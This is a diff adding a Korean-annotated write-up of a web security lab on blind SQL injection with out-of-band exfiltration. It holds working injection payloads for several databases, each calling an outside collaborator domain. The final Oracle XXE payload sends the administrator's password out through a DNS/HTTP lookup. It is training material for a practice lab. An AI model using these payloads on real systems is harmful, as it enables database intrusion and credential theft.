@@ -1,0 +1,26 @@
+#Lab: Blind SQL injection with out-of-band data exfiltration
+
+This lab contains a blind SQL injection vulnerability. 
+The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+The SQL query is executed asynchronously and has no effect on the application's response. 
+However, you can trigger out-of-band interactions with an external domain.
+The database contains a different table called users, with columns called username and password. 
+You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+To solve the lab, log in as the administrator user.
+
+### 🔍 분석 및 공격 과정
+1. users 테이블의 username이 administrator인 유저의 password 얻어내 로그인하는 것이 목표. OAST기법 사용.
+2. 일단 DNS lookup에서 페이로드 하나씩 찔러보며 어느 DB인지 파악 먼저 해보자.
+>>> Microsoft인가? - TrackingId='%3b EXEC master..xp_dirtree '//j8stlckyvdqmy72oao1i8gct1k7fv5ju.oastify.com/a'--
+  아니네용
+>>> PostgreSQL인가?? - TrackingId='%3b COPY (SELECT '') to program 'nslookup hsdr5a4wfbaki5mmumlgsewrlirdf43t.oastify.com'--
+ 아니네...
+>>> MySQL인가??? - TrackingId=' INTO OUTFILE '\\\\xxy7aq9ckrf0nlr2z2qwxu17qywtkl8a.oastify.com\\a' --%20 아니네요..
+>>> Oracle이네요 - TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
+<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//r5x1ikh6slnuvfzw7wyq5o91ys4oseg3.oastify.com/">+%25remote%3b]>'),+'/l')+FROM+dual--
+ collaborator에 로그 찍힘. 오라클임.
+3. 치트시트 참고해서 페이로드 수정해봅니다.
+>>> TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>
+<!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM users where username = 'administrator')||'r5x1ikh6slnuvfzw7wyq5o91ys4oseg3.oastify.com/">+%25remote%3b]>'),+'/l')+FROM+dual--
+ 도착한 패킷중 HTTP패킷을 collaborator에서 조회해봅니다. Request to Collaborator의 Host 값에는 위에서 concatenate한 비밀번호와 도메인주소가 노출되어있습니다.
+기존의 도메인인 r5x1ikh6slnuvfzw7wyq5o91ys4oseg3.oastify.com 를 제외한 앞의 cniit3e1je7smg4n6vx7가 비밀번호가 됩니다. solve
